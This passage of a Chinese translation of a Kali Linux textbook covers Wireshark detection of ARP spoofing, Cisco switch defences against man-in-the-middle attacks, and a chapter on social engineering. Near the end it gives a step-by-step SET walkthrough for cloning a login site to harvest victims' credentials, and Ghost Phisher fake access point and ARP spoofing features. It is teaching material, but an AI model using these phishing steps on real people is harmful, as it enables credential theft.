这帧是一个**地址解析协议（请求）**消息。这帧的发送者具有 MAC 地址`00:0c:29:7e:37:58`和 IP 地址`10.10.10.16`。`10.10.10.16`机器正在本地网络上进行广播。通过观察帧中的目标 MAC 地址是`ff:ff:ff:ff:ff:ff`，可以确定这一点；然而**目标 MAC 地址**为空，而**目标 IP 地址**是`10.10.10.23`。简单来说，`10.10.10.16`机器正在询问本地网络上的每个人，`10.10.10.23`是谁，设备的 MAC 地址是什么。

以下截图显示了来自`10.10.10.16`的**地址解析协议（回复）**（响应）帧。请花些时间观察帧内的所有字段：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/39ef1df2-12c8-4ecf-8582-f91a51592608.png)

具有 IP 地址`10.10.10.23`的设备回复了发送者（`10.10.10.16`），说它的 MAC 地址是`00:0c:29:24:be:4f`。对于`10.10.10.16`和`10.10.10.23`之间的所有未来通信，这两个设备都在它们的 ARP 缓存中拥有对方的 MAC 地址。这些 MAC 地址将用于在网络上转发帧。

在本节中，您已经学会了如何使用 Wireshark 查看和解释在网络上流动的 ARP 消息。在下一节中，我们将介绍如何检测网络上的 ARP 欺骗攻击。

# 检测 ARP 欺骗攻击

作为网络安全专业人员，您可能会被要求帮助组织识别其网络基础设施上的任何 ARP 欺骗攻击。

ARP 欺骗是指攻击者向受害者的机器发送虚假的 ARP 消息，以创建修改受害者 ARP 缓存条目的效果。这将导致受害者的机器将帧（流量）发送到网络中的一个恶意设备，而不是合法目的地。

为了解释 ARP 欺骗的检测过程，我们将使用以下拓扑：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/97abf0ad-e1d0-43b4-a7b8-2fa2221c93e7.png)

使用 Wireshark，我们可以查找网络上端点设备之间特定流量模式。使用 Wireshark 上的`arp`过滤器，我们只能查看**ARP**消息，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/011e7d8f-b884-45e8-b3f9-046b45d64c7d.png)

在**信息**列中，一些数据包有不寻常的描述。通过扩展**帧 1**在**数据包详细信息**窗格中的信息，我们将能够看到发送者（攻击者）向`10.10.10.23`（一台 PC）发送了一个自发的 ARP 消息（ARP 回复）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/1d18383b-4eff-44cf-b2f3-bb80ea020ff5.png)

**帧 1**告诉`10.10.10.23`，`10.10.10.1`（网关）的 MAC 地址是`00:0c:29:7e:37:58`。这将导致受害者更新其 ARP 缓存，将`10.10.10.1`映射到`00:0c:29:7e:37:58`。然而，这个 MAC 地址属于 Kali Linux（攻击者）机器。

以下屏幕截图显示了从攻击者发送到网关（`10.10.10.1`）的帧的内容，说明 PC（`10.10.10.23`）的 MAC 地址现在是`00:0c:29:7e:37:58`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/24c88185-67de-4158-9c4e-1e5db564016b.png)

此外，Wireshark 一直在检测 ARP 帧中的 MAC 地址重复，并发出黄色警告。请记住，Wireshark 是一个网络协议分析器，而不是威胁监控应用程序，因此需要人工干预来对网络流量进行进一步分析。安全设备和工具，如 Cisco Stealthwatch、AlienVault SIEM 和 OpenSOC，可以帮助网络安全专业人员快速识别威胁。

在本节中，您已经学会了如何使用 Wireshark 检测 ARP 欺骗攻击。在下一节中，我们将看看如何检测网络上的可疑活动。

# 检测可疑活动

在许多大型组织中，IT 部门通常会实施一个**网络运营中心**（**NOC**）来监视和解决所有与网络相关的问题。随着安全威胁的增加，组织有时会实施一个专门的团队来专注于网络安全；这个团队被称为**安全运营中心**（**SOC**）。

SOC 的责任范围从威胁监控和消除到安全设备配置、合规性、取证，甚至逆向恶意软件工程。

SOC 应该调查的一些可疑活动包括以下内容：

+   下班后异常的流量激增

+   异常的入站和出站流量

+   异常的 DNS 请求

以下屏幕截图显示了我实验室中的 Wireshark 捕获。通过仔细观察数据包的流动，我们可以看到正在进行端口扫描。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/05e6918d-a93a-42c3-a9d2-acfd9b6dc61e.png)

进行端口扫描的机器的 IP 地址为`10.10.10.16`，而目标的 IP 地址为`10.10.10.100`。**信息**列提供了每个数据包的简要摘要。在这里，我们可以看到对每个网络端口发送了**SYN**探测。我们可以清楚地看到网络上正在执行**SYN**（**隐形**）扫描。

要在 Wireshark 中查看所有 TCP 连接，请按照以下步骤进行：

1.  点击统计 | 端点。

1.  接下来，**端点**窗口将出现，显示所有连接到目标`10.10.10.100`的连接以及攻击者探测的端口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/6b5262ae-ca05-4515-a28f-d6755ba4db98.png)

作为网络安全领域的一员，您将开始培养识别网络流量中异常流量模式的技能。然而，诸如 Wireshark 之类的工具可以极大地帮助您过滤并查看网络中流动的特定类型的数据包。

在本节中，您已经学习了使用 Wireshark 检测网络上可疑活动的基础知识。在接下来的部分中，我们将介绍各种方法来预防和减轻 MITM 攻击。

# MITM 补救技术

在本节中，我们将重点讨论 IT 专业人员可以采用的一些技术，以阻止和预防针对 LAN 的 MITM 攻击。我们将讨论以下主题，以了解它们在 LAN 上阻止和预防 MITM 攻击中所扮演的角色：

+   加密

+   **动态 ARP 检查**（**DAI**）

# 加密

在 MITM 攻击期间，攻击者能够拦截受害者和通信目的地之间的所有流量。加密数据对攻击者来说是不可读的；然而，尽管加密，攻击者仍然能够查看以下细节：

+   源 IP 地址

+   目标 IP 地址

+   源端口

+   目标端口

+   第 3 层协议

在攻击者的机器上，他们只能查看以纯文本发送的流量。以下截图显示了网络上客户端和 Linux 服务器之间的 Wireshark 捕获：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f8b87a9c-d0f8-4d97-9456-0f7a0a386960.png)

服务器正在使用 Telnet 作为远程访问的方法。用户的输入以红色显示，而服务器的响应以蓝色显示。在这里，我们可以看到 Wireshark 已经重新组装了整个 Telnet 会话的所有数据包，并以美丽的对话框格式呈现出来。换句话说，我们可以看到在两台设备之间的 Telnet 会话期间发生的一切。在此捕获中，用户名和密码已被记录。

在企业网络上防止 MITM 攻击至关重要，因为每秒钟都会以多种格式在整个组织中发送敏感信息。

在接下来的部分中，我们将学习如何配置 Cisco IOS 交换机以使用 DAI。

# 动态 ARP 检查

DAI 是交换机上的一项安全功能，可防止无效的 ARP 数据包进入网络。这种技术用于防止 LAN 上的 MITM 攻击和 ARP 欺骗攻击。

在下图中，我们可以看到攻击者试图在 PC 和路由器之间的网络上执行 MITM 攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a6b809a3-9fa8-411f-b838-3eaf92d9b44f.png)

为了防止此类攻击，您可以在 Cisco IOS 交换机上使用以下配置：

1.  在 VLAN 上启用**DHCP 监听**，并在所有干道端口和连接到网络上的 DHCP 服务器的接口上配置可信端口。以下配置正在进行中，以在 Cisco IOS 交换机上启用 DHCP 监听：

```
Switch(config)#ip dhcp snooping Switch(config)#ip dhcp snooping database DHCPsnoop Switch(config)#ip dhcp snooping vlan 2 Switch(config)#interface gigabitEthernet 0/1 Switch(config-if)#ip dhcp snooping trust
```

**DHCP 监听**用于防止恶意用户将**伪造的 DHCP 服务器**连接到企业网络。**信任**端口用于允许`DHCP Offer`和`DHCP ACK`数据包进入网络，而其他端口（不受信任的端口）只允许`DHCP Discover`和`DHCP Request`数据包。

干道端口能够同时传输多个 VLAN 的流量。干道端口是一个交换机和另一个交换机之间，或一个交换机和路由器之间的端口。

1.  在 VLAN 上启用 ARP 检查，并配置所有干道端口为可信端口：

```
Switch(config)#ip arp inspection vlan 2 Switch(config)#interface gigabitEthernet 0/1 Switch(config-if)#ip arp inspection trust Switch(config-if)#exit
```

1.  在交换机上创建一个第 2 层**访问控制列表**（**ACL**），将 IP 地址绑定到 MAC 地址：

```
Switch(config)#arp access-list ARP-Inspect Switch(config-arp-nacl)#permit ip host 10.10.10.1 mac 000b.be56.eb02 Switch(config-arp-nacl)#exit
```

1.  将第 2 层 ACL 映射到 VLAN。以下命令将在交换机上启用 ARP 检查：

```
Switch(config)#ip arp inspection filter ARP-Inspect vlan 2 
```

现在我们能够在 Cisco IOS 交换机上实施 DAI，让我们来看看一些额外的补救技术。

# 嗅探补救技术

检测和减轻网络嗅探器可能有些具有挑战性。网络嗅探器在网络上几乎是不可检测的，因为它被动地监听传入的网络流量。使用安全协议，如 HTTPS、**安全文件传输协议**（**SFTP**）和**安全外壳**（**SSH**）将防止嗅探器看到设备之间发送的原始消息。

此外，您可以使用 Nmap 来发现企业网络中的嗅探器。要做到这一点，请使用以下命令：

```
nmap -sV --script=sniffer-detect <target>
```

确保扫描整个子网和您组织拥有的任何其他网络。此外，IT 专业人员偶尔会对企业网络进行物理扫描，以发现是否有任何未经授权连接到企业局域网的设备。

# 总结

在本章的过程中，我们介绍了 ARP 的基本知识，以及攻击者如何利用 ARP 中的漏洞来执行 ARP 欺骗和 MITM 攻击。此外，我们还研究了使用 Wireshark 来帮助我们分析网络流量，以便快速检测 MITM 和 ARP 攻击。

现在，您已经掌握了使用 Wireshark 检测 ARP 和 MITM 攻击的知识和技能，以及如何在网络交换机上实施安全控制。我希望本章对您的学习和职业有所帮助和启发。

在第十三章中，*客户端攻击-社会工程*，您将了解各种社会工程技术。

# 问题

以下是一些基于本章内容的问题：

1.  如何防止攻击者读取您的数据？

1.  攻击者可以执行什么技术来拦截受害者的网络流量？

1.  思科 IOS 交换机支持哪种安全控制以防止 MITM 攻击？

1.  为什么 IT 专业人员不应该使用 Telnet？

1.  如何在网络上检测嗅探器？

# 进一步阅读

+   **Wireshark 文档**：[`www.wireshark.org/docs/`](https://www.wireshark.org/docs/)


# 第十三章：客户端攻击-社会工程

许多组织倾向于相信，在其网络边界上拥有单一的保护系统足以保护其资产。拥有单一网络防火墙只是单层防御；攻击可以绕过公司网络内的安全系统和控制的方式有很多。一种常用的技术是操纵一个人做某事或向攻击者透露机密信息。这就是所谓的**社会工程**。

作为渗透测试人员，了解这个主题的基本概念、技术和实际方面是很重要的，因为这将帮助你在公司网络中获取用户凭证、系统和网络访问权限，以及有关员工和目标网络的其他敏感信息。在本章的过程中，您将比较和对比不同形式的社会工程攻击，同时使用各种工具和技术创建钓鱼网站，以收集受害者的凭证。

在本章中，我们将涵盖以下主题：

+   社会工程的基础知识

+   社会工程的类型

+   防御社会工程

+   社会工程学（doxing）的侦察

+   为每种类型的社会工程攻击做计划

+   社会工程工具

# 技术要求

以下是本章的技术要求：

+   Kali Linux

# 社会工程的基础知识

社会工程是攻击者或渗透测试人员用来说服某人透露敏感（机密）信息的技术。社会工程可以针对公司帮助台、行政团队、IT 人员、高管团队等进行。任何能够访问有价值的公司信息的员工绝对是主要目标；挑战在于操纵受害者相信你所说的一切并获得他们的信任。一旦获得受害者的信任，下一阶段就是利用它。

以下是社会工程可能对组织产生重大影响的各种方式：

+   由于机密信息的泄露导致收入损失，这将导致客户对公司失去信任。

+   由于公司数据被窃取并可能在网上泄露，隐私丧失。

+   由于违反公司政策可能会发生诉讼和仲裁。

社会工程建立在以下支柱上：

+   人类信任是所有社会工程攻击的重要组成部分。

+   攻击者（社会工程师）通常会请求某种形式的帮助或协助，受害者往往会因为一种善意或道义义务而遵从。

+   员工缺乏安全意识培训，使公司成为更容易的目标。

实施安全政策绝对是确保所有公司资产和员工安全的良好做法。然而，安全政策并不总是有效地防止社会工程攻击。让我们想象一下，一个渗透测试人员打电话给一个组织的帮助台，假装是高级经理之一，要求更改他们的公司用户帐户的密码。帮助台工作人员可能不会要求呼叫者提供有关其身份的进一步验证，而只是执行任务并通过电话提供新的用户帐户密码。攻击者现在可以使用这些用户凭证来访问电子邮件帐户和公司网络的其余部分。

通常没有办法确保完全免受社会工程攻击的安全，因为没有安全软件或硬件能够完全抵御此类攻击。

在接下来的部分，我们将讨论不同类型的社会工程攻击。

# 社会工程的类型

社会工程有许多形式；以下是不同类型的社会工程：

+   **基于人的社会工程**: 这种社会工程通过与他人互动从另一个人那里收集机密信息，换句话说，通过与个人交谈。

+   **基于计算机的社会工程**: 这种社会工程是使用计算机等数字技术执行的。

+   **基于移动设备的社会工程**: 在基于移动设备的社会工程中，攻击者使用移动应用程序对受害者进行攻击。

+   **基于电话的社会工程**: 这种技术涉及对受害者进行语音呼叫，冒充受害者可能信任的人。

+   **通过社交媒体进行社会工程**: 这涉及使用社交媒体平台欺骗人们提供敏感信息。

让我们更详细地看看每个工程过程。

# 基于人的社会工程

在基于人的社会工程中，攻击者假装成有权威的人。攻击者有时会冒充合法的最终用户，提供虚假身份并要求机密信息。此外，攻击者可以假装是组织中的重要用户，如董事或高级工作人员，并要求更改受害者用户帐户的密码。通常，伪装成技术支持的简单形式通常会让用户迅速信任你。想象一下，当你假装是 IT 技术人员并要求用户提供其用户帐户详细信息时，给员工打电话。通常，最终用户并不总是意识到网络安全中的基于人的威胁，并会迅速信任假装是技术支持的人。

在接下来的章节中，我们将深入探讨各种类型的基于人的社会工程技术，包括以下内容:

+   窃听

+   窥视

+   垃圾箱潜水

让我们从窃听开始。

# 窃听

窃听涉及在未经授权的情况下听取人们之间的对话和阅读他们的消息。这种攻击形式包括拦截用户之间的任何传输，如音频、视频或甚至书面通信。

接下来，我们将讨论窥视的概念。

# 窥视

我们中的许多人都有窥视的罪过。你有没有曾经走过一位同事身边，当时他们正在网站上输入数据或执行任务，希望你能看到他们在做什么？

窥视是在某人使用计算机时从其肩膀上窥视。这种技术用于收集诸如 PIN 码、用户 ID 和密码等敏感信息。此外，窥视可以使用数字相机等设备从较远的距离进行。

在下一节中，我们将介绍垃圾箱潜水。

# 垃圾箱潜水

垃圾箱潜水是一种基于人的社会工程形式，攻击者通过查看他人的垃圾，寻找敏感/机密数据。不安全地处理机密物品，如公司文件、过期信用卡、水电费账单和财务记录等，被认为对攻击者有价值。

接下来，我们将介绍基于计算机的社会工程攻击。

# 基于计算机的社会工程

我们大多数人过去都遇到过某种形式的基于计算机的社会工程。在基于计算机的社会工程中，攻击者使用计算设备来帮助他们欺骗受害者透露敏感/机密信息。

在这个类别中有两种主要的攻击形式:

+   网络钓鱼

+   鱼叉式网络钓鱼

以下是一些其他形式的基于计算机的社会工程:

+   弹出窗口要求用户提供信息

+   垃圾邮件

+   连锁信件

+   恶作剧信件

在本章中，我们只会讨论网络钓鱼和鱼叉式网络钓鱼；但是，你可以在空闲时间研究其他内容。

让我们从网络钓鱼开始。

# 网络钓鱼

攻击者通常发送一封包含虚假信息的非法电子邮件，同时掩盖成来自可信任人或来源的合法电子邮件。这种技术用于欺骗用户提供个人信息或其他敏感细节。

想象一下收到一封电子邮件：发件人的名字是你银行的名字，邮件正文中有指示让你点击提供的链接来重置你的网上银行凭证。电子邮件通常以富文本格式呈现给我们，这提供了非常清晰和易于阅读的文本。这种格式隐藏了实际消息的 HTML 代码，并显示纯文本。因此，攻击者可以轻易地掩盖 URL，将用户发送到恶意网站。钓鱼邮件的收件人可能无法识别误导或篡改的细节并点击链接。

接下来，我们将讨论矛头钓鱼。

# 矛头钓鱼

在常规的钓鱼攻击中，攻击者向互联网上的随机电子邮件地址发送数百封通用电子邮件。而在矛头钓鱼中，攻击者向公司内特定群体发送精心制作的消息。与普通的钓鱼攻击相比，矛头钓鱼攻击的响应率更高。

在接下来的部分，我们将介绍基于移动设备的社会工程攻击。

# 基于移动设备的社会工程

基于移动设备的社会工程可能包括为智能手机和平板电脑创建一个恶意应用程序，该应用程序具有非常吸引人的功能，将诱使用户下载并安装该应用程序到他们的设备上。为了掩盖恶意应用程序的真实性质，攻击者使用与官方应用商店上流行应用程序名称相似的名称。一旦恶意应用程序安装到受害者的设备上，该应用程序可以检索并将受害者的用户凭据发送给攻击者。

另一种基于移动设备的社会工程攻击被称为**smishing**。这种类型的攻击涉及攻击者向随机人发送非法短信，其中包含一个恶意 URL，要求潜在受害者通过提供敏感信息来回应。

攻击者有时会向随机人发送短信，声称自己是他们银行的代表。消息中包含一个看起来非常类似于合法银行官方域名的 URL。一个毫无戒心的人可能会点击导致他们进入一个虚假登录门户的恶意链接，该门户将捕获受害者的用户名和密码，甚至在受害者的移动设备上下载恶意负载。

在接下来的部分，我们将介绍通过社交网络进行社会工程。

# 通过社交网络进行社会工程

攻击者通常试图创建一个虚假档案并与人们建立沟通。他们假装成别人，同时试图诱使受害者透露有关自己的敏感细节。此外，还有许多情况下，一个人的帐户被攻击者使用，攻击者使用被攻击帐户与受害者的朋友/联系人列表中的人进行沟通。

攻击通常使用受损的社交网络用户帐户来创建一个非常庞大的朋友/联系人网络，以收集信息和敏感细节。

以下是一些用来诱使目标组织员工的方法：

+   创建一个虚假用户组

+   使用虚假身份，使用目标组织员工的姓名

+   让用户加入一个假用户组，然后要求他们提供凭据，如出生日期和配偶姓名

诸如 Facebook 和 LinkedIn 之类的社交网络网站是许多人可以访问的大型信息库。用户始终要注意他们所透露的信息，因为存在信息被利用的风险。通过使用在社交网络网站上找到的信息，如组织员工发布的帖子，攻击者可以对目标组织进行有针对性的社会工程攻击。

在下一节中，我们将介绍基于电话的社会工程攻击。

# 基于电话的社会工程学（vishing）

**Vishing**是用来描述通过电话进行的社会工程攻击的术语。有许多案例表明，人们接到攻击者的电话，声称他们来自有线电视公司或当地银行，并要求受害者透露敏感信息，如出生日期、驾驶执照号码、银行详细信息，甚至用户帐户凭据。

通常，攻击者在假扮来自合法或授权组织的人时致电目标，要求提供敏感细节。如果第一次尝试不奏效，攻击者可能会再次致电，假扮更重要的人物或技术支持代理，试图诱骗用户提供敏感信息。

此外，当攻击者在 vishing 攻击期间提供虚假身份时，他们通常会提供一个他们所打电话的合法组织的参考，以建立与潜在受害者的信任。当目标不受攻击时，有时会使用威胁，比如“*如果您无法向我们提供您的用户名和密码，您的帐户将被禁用*”。目标有时会相信并提供所请求的信息。

完成了本节，您现在了解了各种类型社会工程攻击的特征。在下一节中，我们将介绍防范社会工程攻击的基本知识。

# 防范社会工程

以下是一些可以用来防御常见社会工程攻击的一般策略：

+   保护您的周界安全

+   保护帮助台和一般员工

+   检测钓鱼邮件

+   额外的对策

在接下来的几节中，我们将更详细地讨论这些话题。

# 保护您的周界安全

攻击者使用冒充和尾随（跟随他人进入安全区域）等方法进入组织的围墙。为了防止此类攻击，组织应为所有员工实施 ID 徽章，基于令牌或生物识别系统进行身份验证，并持续对员工和保安进行安全意识培训。

# 保护帮助台和一般员工

攻击者实施窃听、肩窥和冒充来获取组织帮助台和一般员工的敏感信息。有时，攻击可能会很微妙和有说服力；其他时候，它们可能会有点威胁和侵略性，以对员工施加压力，希望他们透露机密信息。为了保护员工免受此类攻击，组织应确保经常对员工进行培训，提高对这些危险的认识，并让他们知道永远不要透露任何敏感信息。

# 额外的对策

以下是可以减少组织受社会工程攻击威胁的额外措施：

+   实施密码策略，确保用户定期更改他们的密码，同时避免重复使用以前的密码。这将确保如果员工的密码通过社会工程攻击泄露，密码在攻击者手中可能会被密码策略废弃。

+   确保保安人员在围墙内护送所有客人和访客。

+   实施适当的物理安全访问控制系统。这包括监控摄像头、门锁、适当的围栏、生物识别安全措施等，以防止未经授权的人员进入受限区域。

+   实施信息分类。信息分类只允许具有所需安全许可的人员查看某些数据并访问某些系统。

+   对新员工进行背景调查，并实施适当的终止流程。

+   从知名供应商实施端点安全保护。端点保护可用于监视和防止针对员工计算机和笔记本电脑的网络攻击，如社交工程攻击、钓鱼邮件和恶意下载。

+   尽可能实施双因素身份验证。

在接下来的部分，我们将学习如何检测钓鱼邮件。

# 检测钓鱼邮件

电子邮件提供商始终在实施新措施以打击垃圾邮件和防止钓鱼邮件进入用户的邮箱。然而，有时一些钓鱼邮件会进入您的邮箱。以下是一些识别钓鱼诈骗的方法：

+   如果电子邮件来自银行、组织，甚至是社交网络网站，并带有通用的问候消息。

+   钓鱼邮件可能包含恶意附件。

+   钓鱼邮件有时会包含语法错误和拼写错误。

+   发件人的电子邮件地址看起来不合法。

+   它包含指向伪造网站或恶意域的链接。

以下是我几年前收到的一封电子邮件。发件人的姓名和电子邮件是合法的，因为那是我认识的人。然而，这条消息似乎与我之前收到的所有其他电子邮件都不同：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/6865f3df-4806-45e2-8773-025a6ade0b5d.png)

最后一行包含一个超链接，上面写着**点击这里查看**。不了解互联网安全的人可能会点击该链接，然后被引导到一个恶意网站，并下载并执行一个有效负载，导致计算机受到威胁。

让我们更仔细地查看电子邮件的来源细节：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/873d2d8b-a857-4f8d-bbd6-029f1ca5f428.png)

消息的来源向我们展示了消息的所有 HTML 代码。仔细观察，我们会发现攻击者使用较短的 URL 创建了一个超链接，以掩盖真实的 URL。

在本节中，我们讨论了如何识别钓鱼邮件以及攻击者在钓鱼时如何使用 URL 混淆来防止目标看到真实的网址。在下一节中，我们将介绍 doxing 的基本知识。

# 社交工程侦察（doxing）

Doxing 是指攻击者使用在线和公开可用的资源，如搜索引擎和社交网络网站，收集有关特定人或组织的私人详细信息。然后，攻击者可以利用这些信息对目标进行攻击。

在 doxing 攻击期间，攻击者可以通过搜索目标发布的信息来收集有关某人的个人信息。通常，在社交网络网站上，人们会发布大量关于自己、家人和工作的个人信息。当被问及是否担心有人窃取他们的信息时，最常见的回答是“*我没有什么可隐藏的*”或“*我发布照片或评论不会有任何损失*”。

许多人没有意识到，恶意人士可以截取他们的帖子的截图，然后对其进行篡改以进行恶意用途。

在接下来的部分，我们将学习如何规划社交工程攻击。

# 为每种类型的社交工程攻击制定计划。

社会工程攻击的主要目标是要么从受害者那里获取机密信息，要么操纵他们执行某种行动，以帮助他们破坏目标系统或组织。然而，要开始任何类型的攻击，必须进行大量的研究，以了解目标的运作方式；攻击者需要找到答案来回答以下问题：

+   目标组织是否外包他们的 IT 服务？

+   目标是否有帮助台？

除了进行这项研究外，在进行社会工程时，你必须能够迅速制定策略，并读懂受害者对你的反应。

作为社会工程师，发展以下技能很重要：

+   在对话中保持创造性

+   具有良好的沟通技巧，无论是面对面还是通过电话

+   良好的人际交往能力

+   具有健谈和友好的性格

这些技能将帮助你成为一个“人际交往能手”，也就是说，一个友好并与他人交往的人。这种特点是有益的，因为它将帮助你更好地在实时交流中评估受害者的情绪和反应，无论是在电话通话中还是在面对面的对话中。这是一种心理技能，它使你能够读懂某人并操纵他们的行为，让他们以某种方式做出反应或透露机密信息。

接下来，我们将演示如何使用各种社会工程工具。

# 社会工程工具

在这一部分，我们将介绍用于进行社会工程攻击的一些工具。

+   社会工程工具包（SET）

+   Ghost Phisher

让我们更详细地看看这两者。

# 社会工程工具包

SET 是一个设计用于执行各种类型的社会工程攻击的开源框架，并具有创建自定义攻击功能。让我们使用 SET 创建一个假的 Facebook 页面来捕获用户凭据。

要开始，在 Kali Linux 上，点击应用程序|社会工程工具|社会工程工具包：

1.  当 SET 打开时，你将看到一些选项。选择选项`1`来访问 SET 中的社会工程攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f449a633-6041-41b6-a1c6-170ebd911f95.png)

1.  现在将提供不同类型的攻击列表。由于我们试图欺骗用户提供他们的登录凭据，选择 2）网站攻击向量：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4144dd8a-43b2-4eb0-b8ad-83bb6425650c.png)

1.  由于我们的主要重点是捕获用户凭据，选择 3）凭证收割者攻击方法：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/aafa0c16-b589-469e-bde8-31dc7ad38c7a.png)

1.  SET 提供了预安装的社交网络站点模板，并允许你创建一个网站的克隆。在这个练习中，选择 2）网站克隆器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/994c71c2-7910-4780-b32b-8424c410249b.png)

当一个网站被克隆时，SET 会向用户名和密码字段注入特殊代码，这使得它能够实时捕获和显示任何登录尝试。

1.  向攻击者机器提供 IP 地址。如果你在公共网络上，设置一个公共 IP 地址。记住，这个地址将被给予受害者。接下来，指定要被 SET 克隆的网站 URL：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/19d6978f-22c1-4538-a153-9f1f0421c0f7.png)

1.  一旦克隆过程成功完成，使用攻击者的 IP 地址创建一个 URL，并将其发送给你的受害者。URL 应该采用以下格式：[`10.10.10.16/`](https://10.10.10.16/)。你可以使用其他技术来掩盖实际的 IP 地址，并使其看起来合法：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/3ed07130-ca2b-4f66-88b8-8ae48d8381a0.png)

一旦受害者输入了他们的用户凭据，SET 将在 SET 界面上填充用户名和密码，如前面的截图所示。

在下一节中，我们将演示如何使用 Ghost Phisher。

# Ghost Phisher

另一个令人惊奇的社会工程工具是**Ghost Phisher**。它通过其**图形用户界面**（**GUI**）提供了许多易于使用的实用程序，可以非常快速地创建社会工程攻击。

要开始使用 Ghost Phisher，请按照以下步骤操作：

1.  在 Kali Linux 上，单击**应用程序** | **社会工程工具** | **Ghost Phisher**。

1.  一旦工具打开，您将看到主选项卡的选项，即**虚假接入点**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/1c201424-dff2-4db7-831f-4c89b226686f.png)

一旦您的无线网络适配器连接到 Kali Linux 机器上，转到菜单中的无线接口，并根据您的喜好自定义虚假接入点设置。

Ghost Phisher 允许您创建假 DNS 服务器和假 HTTP 服务器。

1.  要创建一个虚假的 DHCP 服务器，只需选择**虚假 DHCP 服务器**选项卡，并添加必要的信息，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/5a1f3791-96ac-40ab-bb3d-78d28b6f2d66.png)

1.  **会话劫持**选项卡允许您执行中间人攻击并捕获实时会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a7bd77ed-1741-4204-b286-803c845e794f.png)

在启动 Ghost Phisher 的会话劫持攻击之前，请确保设置网络的默认网关。

1.  与 arpspoof 类似，有一个内置的 ARP 欺骗工具，可以快速启用中间人攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/194133ea-50fb-4f06-98fc-63edfce3bf71.png)

Ghost Phisher 通过简单易用的界面为渗透测试人员提供了许多功能；甚至还有一个名为**Harvested Credentials**的额外选项卡，显示了在发动的任何攻击中捕获的所有用户名和密码。

# 总结

在本章中，我们讨论了各种形式的社会工程技术和保护个人和组织免受这些攻击的方法。我们看了一下钓鱼邮件的识别特征，以及 Kali Linux 预装的一些社会工程工具。现在您已经完成了这一章，您将能够描述各种形式的社会工程攻击，实施对策以减少成为此类攻击受害者的风险，并执行基于计算机的攻击，通过模仿社交网络网站来捕获受害者的用户凭据。

我希望这一章对你的学习和职业发展有所帮助。

在第十四章中，*执行网站渗透测试*，您将了解网站应用程序渗透测试的基础知识。

# 问题

以下是基于本章内容的一些问题：

1.  当未经授权的人在两方之间的对话中监听时，这被称为什么？

1.  用户收到了一封看起来来自他们当地银行的电子邮件。打开邮件后，用户发现一个 URL，上面写着他们应该点击链接重置密码。这是什么类型的攻击？

1.  用户收到了一条短信，上面有一个 URL，据说来自一个合法的银行。当用户点击链接时，会出现一个网站，要求用户登录。当用户使用他们的凭据登录时，他们被重定向到他们官方银行的网站。这是什么类型的攻击？

1.  Kali Linux 中有哪些社会工程学工具？

# 进一步阅读

+   可以在[`www.imperva.com/learn/application-security/social-engineering-attack/`](https://www.imperva.com/learn/application-security/social-engineering-attack/)找到其他社会工程技术。
